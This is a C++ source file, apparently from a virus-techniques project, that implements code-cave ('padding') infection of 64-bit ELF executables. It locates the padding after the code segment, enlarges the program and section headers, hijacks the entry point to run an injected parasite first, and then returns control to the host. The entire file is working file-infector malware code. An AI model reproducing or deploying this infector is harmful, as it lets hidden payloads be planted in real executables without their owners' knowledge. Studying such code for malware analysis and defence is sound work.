#include "infector/padding_infect.hh"

// elf structure
#include <elf.h>
#include "common/file_descriptor.hh"
// patch arch specific jump code
#include "common/patch_pattern.hh"
#include "common/patch_relinguish_control.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vt::infector {
namespace {
struct ElfPaddingInfo {
  // the code cave size that is available for insertion.
  size_t padding_size;

  // the last byte offset of code setment in file.
  Elf64_Off code_segment_last_byte_offset;

  // the offset in file that the first byte of parasite code starts.
  Elf64_Off parasite_file_offset;

  // the fixed virtual memory address the parasite code is loaded to. Only valid
  // for EXEC elfs.
  Elf64_Addr parasite_load_address;

  // the program header entry corresponding to the code segment that will be
  // patched.
  size_t patch_phdr_entry_idx;

  // the parasite size with extra alignment padding accounted for.
  size_t parasite_size_and_padding;
};

uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & ~(4 - 1)) + 4; }

// Patch SHT (i.e. find the last section of CODE segment and increase its size
// by parasite_size)
bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
               size_t parasite_size_and_padding,
               Elf64_Off code_segment_last_byte_offset) {
  auto base = output_mapping.mutable_base();
  auto elf_header = reinterpret_cast<const Elf64_Ehdr*>(base);

  auto sht_offset = elf_header->e_shoff;
  auto sht_entry_count = elf_header->e_shnum;

  // Point shdr (Pointer to iterate over SHT) to the last entry of SHT
  auto section_entry = reinterpret_cast<Elf64_Shdr*>(base + sht_offset);

  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto current_section_last_byte_offset =
        section_entry->sh_offset + section_entry->sh_size - 1;
    if (code_segment_last_byte_offset == current_section_last_byte_offset) {
      // expand the size while accounting for the alignment padding.
      section_entry->sh_size += parasite_size_and_padding;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  // Failed to find the section header entry.
  return false;
}

void patch_phdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                uint64_t parasite_size_and_padding,
                size_t patch_phdr_entry_idx) {
  auto elf_header = (Elf64_Ehdr*)host_mapping.mutable_base();
  Elf64_Off pht_offset = elf_header->e_phoff;

  // Point to first entry in PHT
  auto phdr_entry = (Elf64_Phdr*)(host_mapping.mutable_base() + pht_offset);
  phdr_entry += patch_phdr_entry_idx;

  // expand the size while accounting for the alignment padding.
  phdr_entry->p_filesz += parasite_size_and_padding;
  phdr_entry->p_memsz += parasite_size_and_padding;
}

Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
                      const ElfPaddingInfo& info) {
  Elf64_Ehdr* header =
      reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
  Elf64_Addr original_entry_point = header->e_entry;
  if (header->e_type == ET_EXEC) {
    header->e_entry = info.parasite_load_address;
  } else {
    header->e_entry = info.parasite_file_offset;
  }
  return original_entry_point;
}

bool patch_parasite_and_resume_control(
    Elf64_Addr original_entry_point, size_t parasite_size,
    vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
    ElfPaddingInfo& info) {
  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  return patch_parasite_and_relinquish_control(
      header->e_type, original_entry_point, info.parasite_load_address,
      info.parasite_file_offset, parasite_size, host_mapping);
}

// Gather information about the elf that can be used to inject parasite into a
// code cave.
// @param host_mapping The host elf mapping.
// @param parasite_size The size of the parasite.
// @param[out] info A struct of information.
bool get_info(const char* host_mapping, uint64_t parasite_size,
              ElfPaddingInfo& info) {
  auto elf_header = (const Elf64_Ehdr*)host_mapping;
  uint16_t pht_entry_count = elf_header->e_phnum;
  Elf64_Off pht_offset = elf_header->e_phoff;
  Elf64_Off code_segment_last_byte_offset = 0;
  Elf64_Off parasite_file_offset = 0;
  Elf64_Addr parasite_load_address = 0;

  // Point to first entry in PHT
  auto phdr_entry = (const Elf64_Phdr*)(host_mapping + pht_offset);

  // Parse PHT entries
  for (size_t i = 0; i < pht_entry_count; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing .text section)
    if (code_segment_last_byte_offset == 0 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      // Calculate the offset of the last byte of the code segment.
      code_segment_last_byte_offset =
          phdr_entry->p_offset + phdr_entry->p_filesz - 1;
      // Sometimes the last section in CODE is .data. Make sure the parasite
      // start address is word aligned for arm. X86-64 has no such requirements.
      parasite_file_offset =
          next_32_bit_aligned_addr(code_segment_last_byte_offset);
      parasite_load_address = next_32_bit_aligned_addr(
          phdr_entry->p_vaddr + phdr_entry->p_filesz - 1);
      continue;
    }

    // Find next segment after CODE Segment and calculate padding size
    if (code_segment_last_byte_offset != 0) {
      if (phdr_entry->p_type != PT_LOAD) {
        // Usually the next segment is R only (rodata) or R/W (data). If the
        // next segment is not loadable to result in a code cave, or if we see
        // another executable segment, the binary probably uses a custom linker
        // script that we can't reasonably inject with certainty. Bail out to
        // avoid curropting it.
        return false;
      }
      // Return padding_size (maximum size of parasite that host can accomodate
      // in its padding between the end of CODE segment and start of next
      // loadable segment)
      info = ElfPaddingInfo{
          .padding_size = phdr_entry->p_offset - parasite_file_offset,
          .code_segment_last_byte_offset = code_segment_last_byte_offset,
          .parasite_file_offset = parasite_file_offset,
          .parasite_load_address = parasite_load_address,
          // the previous entry was for CODE segment
          .patch_phdr_entry_idx = i - 1,
          // Add the extra alignment if necessary because the parasite starts at
          // an aligned address, account for the extra padding. For example, the
          // last byte of CODE is at 0x04, which makes the next word aligned
          // address suitable for virus insertion to start at 0x08. The padding
          // between 0x08 and 0x04 (byte at 0x05, 0x06, 0x07) needs to be added
          // to the total size.
          .parasite_size_and_padding = parasite_file_offset -
                                       code_segment_last_byte_offset - 1 +
                                       parasite_size};
      return true;
    }
  }

  return false;
}

}  // namespace

bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      vt::common::Mmap<PROT_READ> parasite_mapping) {
  const Elf64_Ehdr* ehdr =
      reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
  if ((ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) ||
      ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  ElfPaddingInfo info{};
  // Get padding size in host.
  if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
    vt::printf("Cannot correctly parse host elf\n");
    return false;
  }

  if (info.padding_size < parasite_mapping.size()) {
    vt::printf(
        "Host cannot accomodate parasite padding size: %d parasite size:%d\n",
        info.padding_size, parasite_mapping.size());
    return false;
  }

  // Patch program header table and increase text section size.
  patch_phdr(host_mapping, info.parasite_size_and_padding,
             info.patch_phdr_entry_idx);

  // Patch section header table to increase text section size.
  if (!patch_sht(host_mapping, info.parasite_size_and_padding,
                 info.code_segment_last_byte_offset)) {
    vt::printf("Failed to patch section header table\n");
    return false;
  }

  // Patch elf header entry point to run the parasite first.
  auto original_entry_point = patch_ehdr(host_mapping, info);

  // Inject parasite.
  vt::memcpy(host_mapping.mutable_base() + info.parasite_file_offset,
             parasite_mapping.base(), parasite_mapping.size());

  // Patch parasite to resume host code after execution.
  return patch_parasite_and_resume_control(
      original_entry_point, parasite_mapping.size(), host_mapping, info);
}

}  // namespace vt::infector